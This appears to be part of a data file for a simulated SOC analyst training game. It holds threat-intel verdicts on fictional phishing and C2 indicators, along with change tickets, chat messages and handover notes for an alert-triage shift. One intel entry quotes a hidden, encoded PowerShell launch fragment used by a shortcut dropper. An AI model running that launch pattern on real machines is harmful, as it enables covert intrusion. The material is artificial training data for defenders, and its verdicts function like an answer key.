    'msupdate-cdn-check.example': { verdict: 'malicious', summary: 'Registered 2 days ago via a privacy-protected registrar. Hosts a staged PowerShell payload and C2 listener. Flagged malicious by 11 of 90 vendors. Mimics a Microsoft update CDN naming pattern; not Microsoft-owned.', source: 'VirusTotal / WHOIS' },
    '198.51.100.23': { verdict: 'malicious', summary: 'Resolves msupdate-cdn-check.example. Bulletproof hosting ASN. Observed as a Cobalt Strike-like beacon C2 (TLS cert self-issued, JA3 72a589da586844d7f0818ce684948eea).', source: 'OTX / internal CTI' },
    'docs-brightline-billing.example': { verdict: 'malicious', summary: 'Lookalike of Brightline Packaging\'s billing portal, registered 3 days ago. Serves ZIP lures with LNK droppers.', source: 'URLScan / WHOIS' },
    '203.0.113.45': { verdict: 'malicious', summary: 'Hosts docs-brightline-billing.example. Phishing infrastructure, also the SMTP relay for brightline-pkg-billing.example.', source: 'OTX' },
    'brightline-pkg-billing.example': { verdict: 'malicious', summary: 'Newly registered lookalike of the legitimate vendor domain brightlinepackaging.example. SPF softfail / no DKIM. Reported in Lena\'s IOC digest this morning.', source: 'Internal CTI' },
    'billing@brightline-pkg-billing.example': { verdict: 'malicious', summary: 'Sender spoofing a known AP vendor. Real vendor billing address is accounts@brightlinepackaging.example.', source: 'Internal CTI' },
    'brightlinepackaging.example': { verdict: 'benign', summary: 'Legitimate packaging vendor on the Halvorsen approved vendor list since 2021. This is the real domain being impersonated.', source: 'AP vendor master' },
    [LNK_SHA]: { verdict: 'malicious', summary: 'Windows shortcut dropper. Launches cmd.exe /c powershell -w hidden -enc ... Detected by 28 of 70 engines as Trojan.LNK.Downloader.', source: 'VirusTotal' },
    [EXE_SHA]: { verdict: 'malicious', summary: 'Unsigned PE masquerading as msedgeupdate.exe. Beacon implant, 41 of 72 engines. Genuine Edge updater is signed by Microsoft and lives in Program Files (x86).', source: 'VirusTotal' },
    '203.0.113.150': { verdict: 'suspicious', summary: 'Seen by 7 sensors doing indiscriminate VPN/SSH credential guessing against many networks. Classified as mass scanner / background internet noise.', source: 'GreyNoise-style feed' },
    '198.51.100.99': { verdict: 'benign', summary: 'PingMonitor uptime-checking service egress IP (published range). Not malicious.', source: 'Vendor-published ranges' },
    '10.20.9.15': { verdict: 'benign', summary: 'SCAN01, corporate Tenable scanner, CMDB tag vuln-mgmt. Authorized scanner.', source: 'CMDB' },
    'freightcalc-tools.example': { verdict: 'benign', summary: 'Freight rate calculator SaaS, registered 2017, 45k-ranked, no detections, used by several logistics orgs.', source: 'WHOIS / VirusTotal' },
    '192.0.2.88': { verdict: 'benign', summary: 'Hosts freightcalc-tools.example behind a commodity cloud provider. Clean.', source: 'VirusTotal' },
    '203.0.113.52': { verdict: 'benign', summary: 'US mobile carrier CGNAT range. Geolocation is unreliable (often a regional gateway hundreds of miles from the device).', source: 'ASN lookup' },
    '198.51.100.77': { verdict: 'benign', summary: 'Halvorsen Oak Brook office NAT egress.', source: 'Internal' },
    '203.0.113.88': { verdict: 'benign', summary: 'US mobile carrier CGNAT range (same carrier as Jordan Smith\'s company phone).', source: 'ASN lookup' },
    '198.51.100.40': { verdict: 'benign', summary: 'LinkedIn outbound mail relay.', source: 'SPF record' },
    'dropbox.com': { verdict: 'benign', summary: 'Cloud file sharing. Sanctioned for Marketing under the business plan.', source: 'CASB' },
    'content.dropbox.com': { verdict: 'benign', summary: 'Dropbox upload endpoint.', source: 'CASB' },
    'tbrooke@halvorsenlogistics.com': { verdict: 'benign', summary: 'Internal mailbox: Tamsin Brooke, Customer Service Agent.', source: 'Directory' }
  };

  const changes = [
    { at: '08:00', system: 'SCAN01', desc: 'Weekly authenticated vulnerability scan (Tenable), whole 10.20.0.0/16 range. Window 08:00-10:00.', owner: 'Chidi Eze', ticket: 'CHG-4466' },
    { at: '08:30', system: 'SCCM01', desc: 'Compliance baseline "Software Inventory 2026-Q4" to IT endpoints. Uses PowerShell via CcmExec.', owner: 'Ravi Patel', ticket: 'CHG-4469' },
    { at: '09:30', system: 'FS01 / FS02', desc: 'Migrate departmental shares FS01 -> FS02 using robocopy /MIR by svc-migrate. Window 09:30-12:00, expect heavy I/O.', owner: 'Chidi Eze', ticket: 'CHG-4471' },
    { at: '11:00', system: 'WEB01', desc: 'Customer portal release 4.18. The /status endpoint is replaced by /healthz.', owner: 'Ravi Patel', ticket: 'CHG-4472' },
    { at: '17:00', system: 'VPN-FW01', desc: 'Firmware upgrade to PAN-OS 11.1.4 (after hours).', owner: 'Chidi Eze', ticket: 'CHG-4475' }
  ];

  const chat = [
    { at: '08:10', from: 'sam', text: 'Morning SOC. Monday password resets are flooding the desk, expect failed-logon noise.' },
    { at: '08:40', from: 'lena', text: 'IOC digest is up. New phishing wave impersonating packaging and freight vendors, mostly invoice lures from freshly registered lookalike domains. Check the Intel lookup if something smells off.' },
    { at: '09:32', from: 'chidi', text: 'Heads up all: share migration FS01 -> FS02 is kicking off, will be I/O heavy for a couple of hours. CHG-4471.' },
    { at: '10:20', from: 'tom', text: 'Anyone else seeing tons of lookups in the proxy logs for carriers\' sites? Dispatch is quoting like crazy today.' },
    { at: '11:00', from: 'dana', text: 'Reminder: closing notes need reasoning, not just "FP". Future you (and the next shift) will thank you.' },
    { at: '12:45', from: 'sam', text: 'Lunch trucks outside if anyone needs a break.' },
    { at: '14:00', from: 'chidi', text: 'VPN firewall is being hammered by scanners again. Normal for a Monday, ignore unless something actually logs in.' },
    { at: '14:45', from: 'lena', text: 'Patch Tuesday tomorrow, so expect heavy change noise on the 10th.' }
  ];

  window.SOC_SCENARIOS.push({
    id: 's1-monday', title: 'Monday Morning', tagline: 'Standard day shift at Halvorsen Logistics. The coffee is hot. The queue is not.', difficulty: 'Medium', date: '2026-11-09',
    shift: { start: '08:00', end: '16:00' },
    company: { name: 'Halvorsen Logistics', domain: 'halvorsenlogistics.com', industry: 'Freight & Warehousing', blurb: '450-person freight forwarder and 3PL. Microsoft 365, Entra ID, on-prem AD, Palo Alto VPN.' },
    handover: [
      'From Tom (night): quiet night, zero escalations.',
      'Tenable weekly credentialed scan runs Mon 08:00-10:00 from SCAN01 (CHG-4466). Expect scan alerts.',
      'The encoded PowerShell rule is noisy on IT endpoints during SCCM baseline pushes. Check the parent process and decode the Base64.',
      'Share migration FS01 -> FS02 planned today from ~09:30 (CHG-4471). Heavy file I/O is expected.',
      'The VPN gateway gets scanned all day. It only matters if a login actually succeeds.',
      'Escalate to T2 (Bob/Priya) when you cannot clear an alert with evidence. IR (Marcus/Imani) when compromise is confirmed. Closures need a note with your reasoning.'
    ].join('\n'),
    users, hosts, alerts, events: ev, edr, intel, changes, chat
  });
})();
